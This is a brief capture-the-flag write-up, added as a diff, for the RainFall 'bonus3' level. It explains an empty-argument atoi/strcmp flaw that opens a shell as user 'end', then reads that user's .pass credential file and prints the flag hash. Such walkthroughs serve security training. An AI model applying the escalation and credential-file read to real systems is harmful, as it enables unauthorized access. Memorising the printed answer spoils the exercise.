@@ -1,0 +1,14 @@
+After reversing the program, we can see there is a vulnerability :
+
+buf[atoi(argv[1])]
+strcmp(buf, argv[1]) == 0
+
+if argv[1] is empty (./bonus "") atoi will return 0 and strcmp will compare
+two empty strings and 0 will be returned. The condition is fulfilled and
+a shell opens logged as 'end'
+
+bonus3@RainFall:~$ ./bonus3 ""
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
